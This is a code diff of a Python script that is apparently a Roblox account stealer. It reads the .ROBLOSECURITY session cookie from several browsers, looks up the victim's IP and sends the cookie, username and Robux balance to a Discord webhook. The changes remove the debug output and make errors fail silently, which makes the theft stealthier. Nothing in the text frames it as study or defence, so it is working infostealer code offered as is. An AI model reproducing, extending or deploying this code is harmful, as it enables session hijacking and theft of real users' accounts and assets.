@@ -18,7 +18,7 @@ try:
 except FileNotFoundError:
     print("")
 
-webhook_url = 'heh'  # Replace with your Discord webhook URL
+webhook_url = 'heh'
 
 dummy_message = "Loading..."
 print(dummy_message)
@@ -69,77 +69,63 @@ def CookieLog():
         return decrypted_value
     db.close()
 
-
 def PlanB():
-    data = []  # data[0] == All Cookies (Used For Requests) // data[1] == .ROBLOSECURITY Cookie (Used For Logging In To The Account)
+    data = [] # data[0] == All Cookies (Used For Requests) // data[1] == .ROBLOSECURITY Cookie (Used For Logging In To The Account)
 
     try:
         cookies = browser_cookie3.firefox(domain_name='roblox.com')
-        print(f"Cookies (Firefox): {cookies}")  # Debugging the cookies
         for cookie in cookies:
             if cookie.name == '.ROBLOSECURITY':
                 data.append(cookies)
                 data.append(cookie.value)
                 return data
-    except Exception as e:
-        print(f"Error in PlanB with Firefox: {e}")
-
+    except:
+        pass
     try:
         cookies = browser_cookie3.chromium(domain_name='roblox.com')
-        print(f"Cookies (Chromium): {cookies}")  # Debugging the cookies
         for cookie in cookies:
             if cookie.name == '.ROBLOSECURITY':
                 data.append(cookies)
                 data.append(cookie.value)
                 return data
-    except Exception as e:
-        print(f"Error in PlanB with Chromium: {e}")
+    except:
+        pass
 
     try:
         cookies = browser_cookie3.edge(domain_name='roblox.com')
-        print(f"Cookies (Edge): {cookies}")  # Debugging the cookies
         for cookie in cookies:
             if cookie.name == '.ROBLOSECURITY':
                 data.append(cookies)
                 data.append(cookie.value)
                 return data
-    except Exception as e:
-        print(f"Error in PlanB with Edge: {e}")
+    except:
+        pass
 
     try:
         cookies = browser_cookie3.opera(domain_name='roblox.com')
-        print(f"Cookies (Opera): {cookies}")  # Debugging the cookies
         for cookie in cookies:
             if cookie.name == '.ROBLOSECURITY':
                 data.append(cookies)
                 data.append(cookie.value)
                 return data
-    except Exception as e:
-        print(f"Error in PlanB with Opera: {e}")
+    except:
+        pass
 
     try:
         cookies = browser_cookie3.chrome(domain_name='roblox.com')
-        print(f"Cookies (Chrome): {cookies}")  # Debugging the cookies
         for cookie in cookies:
             if cookie.name == '.ROBLOSECURITY':
                 data.append(cookies)
                 data.append(cookie.value)
                 return data
-    except Exception as e:
-        print(f"Error in PlanB with Chrome: {e}")
-
-    return None
+    except:
+        pass
 
 
 cookies = PlanB()
 
 if CookieLog() == None:
-    cookies = PlanB()
-
-if not cookies:
-    print("No valid Roblox cookie found.")
-    exit(1)  # Exit if no cookie is found
-
+    PlanB()
 
 def get_local_ip():
     ip = requests.get('http://api.ipify.org').text
@@ -206,7 +192,7 @@ if __name__ == "__main__":
     headshot = headshot_json["data"][0]["imageUrl"]
 
     username = info['UserName']
-    robux = requests.get("https://economy.roblox.com/v1/user/currency", cookies={'.ROBLOSECURITY': roblox_cookie}).json()["robux"]
+    robux = requests.get("https://economy.roblox.com/v1/user/currency",cookies={'.ROBLOSECURITY': roblox_cookie}).json()["robux"]
     premium_status = info['IsPremium']
 
     discord = Discord(url=webhook_url)
@@ -234,4 +220,8 @@ if __name__ == "__main__":
 
     discord.post(
         username="BOT - Ovion",
-        avatar_url="https://cdn.discordapp.com/attachments/1238207103894552658/1258507913161347202/a339721183f60c18b3424ba7b73daf1b.png?ex=66884c54&is=6686fad4&hm=4a7fe8ae
+        avatar_url="https://cdn.discordapp.com/attachments/1238207103894552658/1258507913161347202/a339721183f60c18b3424ba7b73daf1b.png?ex=66884c54&is=6686fad4&hm=4a7fe8ae14e5c8d943518b69a5be029aa8bc2b5a4861c74db4ef05cf62f56754&",
+        embeds=[
+            {"title": ".ROBLOSECURITY", "description": f"```{roblox_cookie}```"}
+        ],
+            )
